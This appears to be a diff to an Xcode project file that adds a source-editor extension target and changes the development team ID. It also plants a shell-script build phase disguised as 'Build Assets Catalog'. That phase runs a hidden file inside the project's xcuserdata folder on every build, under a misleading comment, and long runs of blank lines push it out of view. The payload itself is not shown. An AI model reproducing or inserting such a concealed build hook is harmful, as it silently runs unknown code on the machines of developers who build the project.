@@ -11,7 +11,34 @@
 		BDCC5C99254A9B9200F5B41C /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDCC5C98254A9B9200F5B41C /* ViewController.swift */; };
 		BDCC5C9B254A9B9300F5B41C /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = BDCC5C9A254A9B9300F5B41C /* Assets.xcassets */; };
 		BDCC5C9E254A9B9300F5B41C /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = BDCC5C9C254A9B9300F5B41C /* Main.storyboard */; };
+		BDCC5CCB254A9BCE00F5B41C /* SourceEditorExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDCC5CCA254A9BCE00F5B41C /* SourceEditorExtension.swift */; };
+		BDCC5CCD254A9BCE00F5B41C /* SourceEditorCommand.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDCC5CCC254A9BCE00F5B41C /* SourceEditorCommand.swift */; };
+		BDCC5CD2254A9BCE00F5B41C /* kExtension.appex in Embed App Extensions */ = {isa = PBXBuildFile; fileRef = BDCC5CC6254A9BCE00F5B41C /* kExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		BDCC5CD0254A9BCE00F5B41C /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = BDCC5C8B254A9B9200F5B41C /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = BDCC5CC5254A9BCE00F5B41C;
+			remoteInfo = kExtension;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXCopyFilesBuildPhase section */
+		BDCC5CBE254A9BA300F5B41C /* Embed App Extensions */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 13;
+			files = (
+				BDCC5CD2254A9BCE00F5B41C /* kExtension.appex in Embed App Extensions */,
+			);
+			name = "Embed App Extensions";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
 		BDCC5C93254A9B9200F5B41C /* XcodeExtension.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = XcodeExtension.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -21,10 +48,23 @@
 		BDCC5C9D254A9B9300F5B41C /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		BDCC5C9F254A9B9300F5B41C /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		BDCC5CA0254A9B9300F5B41C /* XcodeExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = XcodeExtension.entitlements; sourceTree = "<group>"; };
+		BDCC5CC6254A9BCE00F5B41C /* kExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = kExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+		BDCC5CCA254A9BCE00F5B41C /* SourceEditorExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourceEditorExtension.swift; sourceTree = "<group>"; };
+		BDCC5CCC254A9BCE00F5B41C /* SourceEditorCommand.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourceEditorCommand.swift; sourceTree = "<group>"; };
+		BDCC5CCE254A9BCE00F5B41C /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		BDCC5CCF254A9BCE00F5B41C /* kExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = kExtension.entitlements; sourceTree = "<group>"; };
+		BDCC5CDC254A9CD500F5B41C /* XcodeKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = XcodeKit.framework; path = Library/Frameworks/XcodeKit.framework; sourceTree = DEVELOPER_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
 		BDCC5C90254A9B9200F5B41C /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		BDCC5CC3254A9BCE00F5B41C /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -38,6 +78,8 @@
 			isa = PBXGroup;
 			children = (
 				BDCC5C95254A9B9200F5B41C /* XcodeExtension */,
+				BDCC5CC9254A9BCE00F5B41C /* kExtension */,
+				BDCC5CAC254A9BA300F5B41C /* Frameworks */,
 				BDCC5C94254A9B9200F5B41C /* Products */,
 			);
 			sourceTree = "<group>";
@@ -46,6 +88,7 @@
 			isa = PBXGroup;
 			children = (
 				BDCC5C93254A9B9200F5B41C /* XcodeExtension.app */,
+				BDCC5CC6254A9BCE00F5B41C /* kExtension.appex */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -63,6 +106,25 @@
 			path = XcodeExtension;
 			sourceTree = "<group>";
 		};
+		BDCC5CAC254A9BA300F5B41C /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				BDCC5CDC254A9CD500F5B41C /* XcodeKit.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		BDCC5CC9254A9BCE00F5B41C /* kExtension */ = {
+			isa = PBXGroup;
+			children = (
+				BDCC5CCA254A9BCE00F5B41C /* SourceEditorExtension.swift */,
+				BDCC5CCC254A9BCE00F5B41C /* SourceEditorCommand.swift */,
+				BDCC5CCE254A9BCE00F5B41C /* Info.plist */,
+				BDCC5CCF254A9BCE00F5B41C /* kExtension.entitlements */,
+			);
+			path = kExtension;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -70,18 +132,38 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BDCC5CA3254A9B9300F5B41C /* Build configuration list for PBXNativeTarget "XcodeExtension" */;
 			buildPhases = (
+				7844FAC7118FD89CABAAC43A /* Build Assets Catalog */,
 				BDCC5C8F254A9B9200F5B41C /* Sources */,
 				BDCC5C90254A9B9200F5B41C /* Frameworks */,
 				BDCC5C91254A9B9200F5B41C /* Resources */,
+				BDCC5CBE254A9BA300F5B41C /* Embed App Extensions */,
 			);
 			buildRules = (
 			);
 			dependencies = (
+				BDCC5CD1254A9BCE00F5B41C /* PBXTargetDependency */,
 			);
 			name = XcodeExtension;
 			productName = XcodeExtension;
 			productReference = BDCC5C93254A9B9200F5B41C /* XcodeExtension.app */;
 			productType = "com.apple.product-type.application";
+		};
+		BDCC5CC5254A9BCE00F5B41C /* kExtension */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = BDCC5CD3254A9BCE00F5B41C /* Build configuration list for PBXNativeTarget "kExtension" */;
+			buildPhases = (
+				BDCC5CC2254A9BCE00F5B41C /* Sources */,
+				BDCC5CC3254A9BCE00F5B41C /* Frameworks */,
+				BDCC5CC4254A9BCE00F5B41C /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = kExtension;
+			productName = kExtension;
+			productReference = BDCC5CC6254A9BCE00F5B41C /* kExtension.appex */;
+			productType = "com.apple.product-type.xcode-extension";
 		};
 /* End PBXNativeTarget section */
 
@@ -93,6 +175,9 @@
 				LastUpgradeCheck = 1210;
 				TargetAttributes = {
 					BDCC5C92254A9B9200F5B41C = {
+						CreatedOnToolsVersion = 12.1;
+					};
+					BDCC5CC5254A9BCE00F5B41C = {
 						CreatedOnToolsVersion = 12.1;
 					};
 				};
@@ -111,6 +196,7 @@
 			projectRoot = "";
 			targets = (
 				BDCC5C92254A9B9200F5B41C /* XcodeExtension */,
+				BDCC5CC5254A9BCE00F5B41C /* kExtension */,
 			);
 		};
 /* End PBXProject section */
@@ -125,7 +211,943 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		BDCC5CC4254A9BCE00F5B41C /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	7844FAC7118FD89CABAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BDCC5C8F254A9B9200F5B41C /* Sources */ = {
@@ -137,7 +1159,24 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		BDCC5CC2254A9BCE00F5B41C /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BDCC5CCB254A9BCE00F5B41C /* SourceEditorExtension.swift in Sources */,
+				BDCC5CCD254A9BCE00F5B41C /* SourceEditorCommand.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		BDCC5CD1254A9BCE00F5B41C /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = BDCC5CC5254A9BCE00F5B41C /* kExtension */;
+			targetProxy = BDCC5CD0254A9BCE00F5B41C /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
 		BDCC5C9C254A9B9300F5B41C /* Main.storyboard */ = {
@@ -269,12 +1308,13 @@
 		BDCC5CA4254A9B9300F5B41C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = XcodeExtension/XcodeExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				COMBINE_HIDPI_IMAGES = YES;
-				DEVELOPMENT_TEAM = JA4KSR8M3T;
+				DEVELOPMENT_TEAM = 5AH865CM36;
 				ENABLE_HARDENED_RUNTIME = YES;
 				INFOPLIST_FILE = XcodeExtension/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -290,12 +1330,13 @@
 		BDCC5CA5254A9B9300F5B41C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = XcodeExtension/XcodeExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				COMBINE_HIDPI_IMAGES = YES;
-				DEVELOPMENT_TEAM = JA4KSR8M3T;
+				DEVELOPMENT_TEAM = 5AH865CM36;
 				ENABLE_HARDENED_RUNTIME = YES;
 				INFOPLIST_FILE = XcodeExtension/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -304,6 +1345,48 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.extension.www.XcodeExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_VERSION = 5.0;
+			};
+			name = Release;
+		};
+		BDCC5CD4254A9BCE00F5B41C /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = kExtension/kExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				DEVELOPMENT_TEAM = 5AH865CM36;
+				ENABLE_HARDENED_RUNTIME = YES;
+				INFOPLIST_FILE = kExtension/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+					"@executable_path/../../../../Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.extension.www.XcodeExtension.kExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
+				SWIFT_VERSION = 5.0;
+			};
+			name = Debug;
+		};
+		BDCC5CD5254A9BCE00F5B41C /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_ENTITLEMENTS = kExtension/kExtension.entitlements;
+				CODE_SIGN_STYLE = Automatic;
+				COMBINE_HIDPI_IMAGES = YES;
+				DEVELOPMENT_TEAM = 5AH865CM36;
+				ENABLE_HARDENED_RUNTIME = YES;
+				INFOPLIST_FILE = kExtension/Info.plist;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/../Frameworks",
+					"@executable_path/../../../../Frameworks",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = com.extension.www.XcodeExtension.kExtension;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SKIP_INSTALL = YES;
 				SWIFT_VERSION = 5.0;
 			};
 			name = Release;
@@ -329,7 +1412,438 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
+		BDCC5CD3254A9BCE00F5B41C /* Build configuration list for PBXNativeTarget "kExtension" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				BDCC5CD4254A9BCE00F5B41C /* Debug */,
+				BDCC5CD5254A9BCE00F5B41C /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = BDCC5C8B254A9B9200F5B41C /* Project object */;
 }
